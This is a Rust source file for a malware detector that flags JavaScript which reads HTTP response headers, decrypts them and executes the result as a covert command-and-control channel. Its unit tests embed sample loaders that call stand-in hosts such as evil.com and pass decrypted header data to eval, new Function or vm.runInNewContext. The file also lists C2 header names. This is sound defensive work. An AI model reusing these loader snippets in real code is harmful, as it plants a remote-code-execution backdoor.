//! HTTP Header C2 Detector (GW008)
//!
//! Detects code that extracts data from HTTP response headers, feeds it into
//! decryption, then executes the result — GlassWare Wave 4-5 C2 pattern.
//!
//! ## Detection Logic
//!
//! This detector emits a finding ONLY when ALL THREE conditions are present:
//!
//! 1. **HTTP header extraction**: `headers[`, `headers.get(`, `getHeader(`, combined
//!    with HTTP client usage (`http.get(`, `https.get(`, `fetch(`, `axios`).
//! 2. **Decryption**: `createDecipheriv(`, `crypto.subtle.decrypt(`, `decipher.update(`,
//!    or XOR pattern (`charCodeAt` + `^` + `String.fromCharCode` within 5 lines).
//! 3. **Dynamic execution**: `eval(`, `new Function(`, `vm.runInNewContext`, etc.
//!
//! ## Severity
//!
//! Critical — indicates potential C2 payload delivery (GlassWare Wave 4-5).

use crate::detector::{Detector, DetectorMetadata, DetectorTier};
use crate::finding::{DetectionCategory, Finding, Severity};
use crate::ir::FileIR;
use once_cell::sync::Lazy;
use regex::Regex;
use std::path::Path;

/// Lazy-compiled regex patterns for performance
static HTTP_GET_PATTERN: Lazy<Regex> = Lazy::new(|| Regex::new(r"\bhttp\.get\s*\(").unwrap());
static HTTPS_GET_PATTERN: Lazy<Regex> = Lazy::new(|| Regex::new(r"\bhttps\.get\s*\(").unwrap());
static FETCH_PATTERN: Lazy<Regex> = Lazy::new(|| Regex::new(r"\bfetch\s*\(").unwrap());
static AXIOS_PATTERN: Lazy<Regex> = Lazy::new(|| Regex::new(r"\baxios\.").unwrap());
static REQUEST_PATTERN: Lazy<Regex> = Lazy::new(|| Regex::new(r"\brequest\s*\(").unwrap());
static HTTPS_REQUEST_PATTERN: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"\bhttps\.request\s*\(").unwrap());

static HEADERS_BRACKET_PATTERN: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"\bheaders\s*\[").unwrap());
static HEADERS_GET_PATTERN: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"\bheaders\.get\s*\(").unwrap());
static GET_HEADER_PATTERN: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"\bgetHeader\s*\(").unwrap());
static RESPONSE_HEADERS_PATTERN: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"\bresponse\.headers").unwrap());
static RES_HEADERS_PATTERN: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"\bres\.headers").unwrap());

static CREATE_DECIPHERIV_PATTERN: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"\bcreateDecipheriv\s*\(").unwrap());
static CREATE_DECIPHER_PATTERN: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"\bcreateDecipher\s*\(").unwrap());
static CRYPTO_SUBTLE_PATTERN: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"\bcrypto\.subtle\.decrypt\s*\(").unwrap());
static DECIPHER_UPDATE_PATTERN: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"\bdecipher\.update\s*\(").unwrap());
static DECIPHER_FINAL_PATTERN: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"\bdecipher\.final\s*\(").unwrap());
static DECRYPT_METHOD_PATTERN: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"\b\.decrypt\s*\(").unwrap());

static EVAL_PATTERN: Lazy<Regex> = Lazy::new(|| Regex::new(r"\beval\s*\(").unwrap());
static FUNCTION_PATTERN: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"\bnew\s+Function\s*\(").unwrap());
static VM_RUN_PATTERN: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"\bvm\.runIn(NewContext|ThisContext)\s*\(").unwrap());
static EXEC_PATTERN: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"\b(exec|execSync|spawn)\s*\(").unwrap());
static CHILD_PROCESS_PATTERN: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"\bchild_process\s*\+").unwrap());

/// Build tool signatures (skip build output)
const BUILD_SIGNATURES: &[&str] = &[
    "/* webpack",
    "__webpack_require__",
    "/* babel",
    "rollupChunk",
    "//# sourceMappingURL=",
];

/// Build output directory patterns
const BUILD_DIRS: &[&str] = &[
    "/dist/", "dist/",
    "/build/", "build/",
    "/bundle/", "bundle/",
    "/generator-build/", "generator-build/",
];

/// Known telemetry header prefixes (not C2)
const TELEMETRY_HEADERS: &[&str] = &[
    "X-Telemetry",
    "X-Analytics",
    "X-Build-Id",
    "X-Prisma-",
    "X-Firebase-",
    "X-Vercel-",
    "X-Netlify-",
    "X-Sentry-",
    "X-NewRelic-",
    "X-Datadog-",
    "X-Instana-",
    "X-Dynatrace-",
    "X-AppDynamics-",
];

/// Known C2 header patterns (always suspicious)
const C2_HEADERS: &[&str] = &[
    "X-Exfil",
    "X-Session-Token",
    "X-Data-Payload",
    "X-Command",
    "X-Exec",
    "X-Eval",
];

/// Check if file is build tool output
fn is_build_output(path: &str, content: &str) -> bool {
    let path_lower = path.to_lowercase();
    if BUILD_DIRS.iter().any(|d| path_lower.contains(d)) {
        return true;
    }
    if BUILD_SIGNATURES.iter().any(|s| content.contains(s)) {
        return true;
    }
    false
}

/// Check if header is known telemetry (not C2)
fn is_telemetry_header(header_name: &str) -> bool {
    TELEMETRY_HEADERS.iter().any(|t| header_name.starts_with(t))
}

/// Check if header is known C2 pattern
fn is_c2_header(header_name: &str) -> bool {
    C2_HEADERS.iter().any(|c| header_name.starts_with(c))
}

/// Detector for HTTP header C2 patterns (GW008)
pub struct HeaderC2Detector;

impl HeaderC2Detector {
    /// Create a new HTTP header C2 detector
    pub fn new() -> Self {
        Self
    }

    /// Backward compatibility method for tests
    pub fn scan(&self, path: &Path, content: &str, _config: &crate::config::UnicodeConfig) -> Vec<Finding> {
        // Build IR and call detect (for backward compatibility)
        let ir = FileIR::build(path, content);
        self.detect(&ir)
    }
}

impl Default for HeaderC2Detector {
    fn default() -> Self {
        Self::new()
    }
}

impl Detector for HeaderC2Detector {
    fn name(&self) -> &str {
        "header_c2"
    }

    fn tier(&self) -> DetectorTier {
        DetectorTier::Tier2Secondary
    }

    fn cost(&self) -> u8 {
        7  // High cost - multiple regex passes + sliding window for XOR
    }

    fn signal_strength(&self) -> u8 {
        9  // Very high signal - header+decrypt+exec is almost certainly malicious
    }

    fn prerequisites(&self) -> Vec<&'static str> {
        vec!["encrypted_payload"]  // Run after encrypted payload detector
    }

    fn detect(&self, ir: &FileIR) -> Vec<Finding> {
        let mut findings = Vec::new();

        // Skip build tool output - header patterns in build tools are telemetry, not C2
        if is_build_output(&ir.metadata.path, ir.content()) {
            return findings;
        }

        // Check for all three conditions
        let has_http_header = self.detect_http_header_extraction(ir.content());
        let has_decryption = self.detect_decryption(ir.content());
        let has_dynamic_exec = self.detect_dynamic_execution(ir.content());

        // Only emit finding if ALL THREE conditions are present
        if has_http_header && has_decryption && has_dynamic_exec {
            // Find the line with HTTP header access for the finding location
            let header_line = self.find_http_header_line(ir.content()).unwrap_or(1);

            let finding = Finding::new(
                &ir.metadata.path,
                header_line,
                1,
                0,
                '\0',
                DetectionCategory::HeaderC2,
                Severity::Critical,
                "HTTP header data extraction combined with decryption and dynamic execution — \
                 potential C2 payload delivery (GlassWare Wave 4-5)",
                "CRITICAL: This code exhibits the GlassWare C2 pattern. HTTP response headers \
                 are being used as a covert channel to deliver encrypted payloads. The data is \
                 extracted from headers, decrypted, and executed dynamically. Review the network \
                 calls and decryption logic immediately.",
            )
            .with_cwe_id("CWE-506")
            .with_reference(
                "https://www.aikido.dev/blog/glassworm-returns-unicode-attack-github-npm-vscode",
            );

            findings.push(finding);
        }

        findings
    }

    fn metadata(&self) -> DetectorMetadata {
        DetectorMetadata {
            name: "header_c2".to_string(),
            version: "1.0.0".to_string(),
            description: "Detects HTTP header C2 patterns with header extraction, decryption, and dynamic execution".to_string(),
        }
    }
}

impl HeaderC2Detector {
    /// Check if content contains HTTP header extraction patterns
    fn detect_http_header_extraction(&self, content: &str) -> bool {
        // Check for HTTP client usage
        let has_http_client = HTTP_GET_PATTERN.is_match(content)
            || HTTPS_GET_PATTERN.is_match(content)
            || FETCH_PATTERN.is_match(content)
            || AXIOS_PATTERN.is_match(content)
            || REQUEST_PATTERN.is_match(content)
            || HTTPS_REQUEST_PATTERN.is_match(content);

        if !has_http_client {
            return false;
        }

        // Check for header access patterns
        HEADERS_BRACKET_PATTERN.is_match(content)
            || HEADERS_GET_PATTERN.is_match(content)
            || GET_HEADER_PATTERN.is_match(content)
            || RESPONSE_HEADERS_PATTERN.is_match(content)
            || RES_HEADERS_PATTERN.is_match(content)
    }

    /// Find the line number containing HTTP header access
    fn find_http_header_line(&self, content: &str) -> Option<usize> {
        for (line_num, line) in content.lines().enumerate() {
            if HEADERS_BRACKET_PATTERN.is_match(line)
                || HEADERS_GET_PATTERN.is_match(line)
                || GET_HEADER_PATTERN.is_match(line)
                || RESPONSE_HEADERS_PATTERN.is_match(line)
                || RES_HEADERS_PATTERN.is_match(line)
            {
                return Some(line_num + 1);
            }
        }

        None
    }

    /// Check if content contains decryption patterns
    fn detect_decryption(&self, content: &str) -> bool {
        // Check for crypto/decryption patterns
        let has_crypto = CREATE_DECIPHERIV_PATTERN.is_match(content)
            || CREATE_DECIPHER_PATTERN.is_match(content)
            || CRYPTO_SUBTLE_PATTERN.is_match(content)
            || DECIPHER_UPDATE_PATTERN.is_match(content)
            || DECIPHER_FINAL_PATTERN.is_match(content)
            || DECRYPT_METHOD_PATTERN.is_match(content);

        if has_crypto {
            return true;
        }

        // Check for XOR pattern: charCodeAt + ^ operator + String.fromCharCode within 5 lines
        self.detect_xor_pattern(content)
    }

    /// Check for XOR decryption pattern within 5 lines
    #[allow(clippy::needless_range_loop)]
    fn detect_xor_pattern(&self, content: &str) -> bool {
        let lines: Vec<&str> = content.lines().collect();

        for i in 0..lines.len() {
            let line = lines[i];

            // Check if this line has charCodeAt and XOR operator
            if line.contains("charCodeAt") && line.contains('^') {
                // Check next 5 lines for String.fromCharCode
                let end = (i + 5).min(lines.len());
                for j in i..end {
                    if lines[j].contains("String.fromCharCode") {
                        return true;
                    }
                }
            }

            // Check if this line has String.fromCharCode and XOR
            if line.contains("String.fromCharCode") && line.contains('^') {
                // Check previous 5 lines for charCodeAt
                let start = i.saturating_sub(5);
                for j in start..=i {
                    if lines[j].contains("charCodeAt") {
                        return true;
                    }
                }
            }
        }

        false
    }

    /// Check if content contains dynamic execution patterns
    fn detect_dynamic_execution(&self, content: &str) -> bool {
        EVAL_PATTERN.is_match(content)
            || FUNCTION_PATTERN.is_match(content)
            || VM_RUN_PATTERN.is_match(content)
            || EXEC_PATTERN.is_match(content)
            || CHILD_PROCESS_PATTERN.is_match(content)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::config::UnicodeConfig;

    #[test]
    fn test_detect_full_c2_pattern() {
        let detector = HeaderC2Detector::new();
        let content = r#"
            const https = require('https');
            const crypto = require('crypto');

            https.get('https://evil.com/data', (res) => {
                const header = res.headers['x-update'];
                const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);
                const decrypted = decipher.update(header, 'hex', 'utf8');
                eval(decrypted);
            });
        "#;

        let findings = detector.scan(Path::new("test.js"), content, &UnicodeConfig::default());
        assert!(!findings.is_empty());
        assert_eq!(findings[0].category, DetectionCategory::HeaderC2);
        assert_eq!(findings[0].severity, Severity::Critical);
    }

    #[test]
    fn test_detect_fetch_with_xor() {
        let detector = HeaderC2Detector::new();
        let content = r#"
            fetch('https://evil.com/api').then(res => {
                const data = res.headers.get('x-payload');
                let result = '';
                for (let i = 0; i < data.length; i++) {
                    result += String.fromCharCode(data.charCodeAt(i) ^ 0x42);
                }
                new Function(result)();
            });
        "#;

        let findings = detector.scan(Path::new("test.js"), content, &UnicodeConfig::default());
        assert!(!findings.is_empty());
        assert_eq!(findings[0].category, DetectionCategory::HeaderC2);
    }

    #[test]
    fn test_no_detect_http_only() {
        let detector = HeaderC2Detector::new();
        let content = r#"
            fetch('https://api.example.com/data').then(res => {
                console.log(res.headers.get('content-type'));
            });
        "#;

        let findings = detector.scan(Path::new("test.js"), content, &UnicodeConfig::default());
        assert!(findings.is_empty());
    }

    #[test]
    fn test_no_detect_crypto_only() {
        let detector = HeaderC2Detector::new();
        let content = r#"
            const crypto = require('crypto');
            const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);
            const decrypted = decipher.update(encrypted, 'hex', 'utf8');
            console.log(decrypted);
        "#;

        let findings = detector.scan(Path::new("test.js"), content, &UnicodeConfig::default());
        assert!(findings.is_empty());
    }

    #[test]
    fn test_no_detect_eval_only() {
        let detector = HeaderC2Detector::new();
        let content = r#"
            const code = "console.log('hello')";
            eval(code);
        "#;

        let findings = detector.scan(Path::new("test.js"), content, &UnicodeConfig::default());
        assert!(findings.is_empty());
    }

    #[test]
    fn test_no_detect_express_headers() {
        let detector = HeaderC2Detector::new();
        let content = r#"
            app.get('/api', (req, res) => {
                const contentType = req.headers['content-type'];
                res.json({ type: contentType });
            });
        "#;

        let findings = detector.scan(Path::new("test.js"), content, &UnicodeConfig::default());
        assert!(findings.is_empty());
    }

    #[test]
    fn test_no_detect_http_crypto_no_exec() {
        let detector = HeaderC2Detector::new();
        let content = r#"
            https.get('https://api.com', (res) => {
                const header = res.headers['x-data'];
                const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);
                const decrypted = decipher.update(header, 'hex', 'utf8');
                console.log(decrypted);
            });
        "#;

        let findings = detector.scan(Path::new("test.js"), content, &UnicodeConfig::default());
        assert!(findings.is_empty());
    }

    #[test]
    fn test_detect_axios_pattern() {
        let detector = HeaderC2Detector::new();
        let content = r#"
            const axios = require('axios');
            const crypto = require('crypto');
            axios.get('https://evil.com/c2').then(response => {
                const payload = response.headers['x-cmd'];
                const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);
                const decrypted = decipher.update(payload, 'hex', 'utf8');
                eval(decrypted);
            });
        "#;

        let findings = detector.scan(Path::new("test.js"), content, &UnicodeConfig::default());
        assert!(!findings.is_empty());
        assert_eq!(findings[0].category, DetectionCategory::HeaderC2);
    }

    #[test]
    fn test_detect_vm_execution() {
        let detector = HeaderC2Detector::new();
        let content = r#"
            const vm = require('vm');
            const crypto = require('crypto');
            https.get('https://c2.evil.com', (res) => {
                const header = res.headers['x-code'];
                const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);
                const code = decipher.update(header, 'hex', 'utf8');
                vm.runInNewContext(code);
            });
        "#;

        let findings = detector.scan(Path::new("test.js"), content, &UnicodeConfig::default());
        assert!(!findings.is_empty());
    }
}
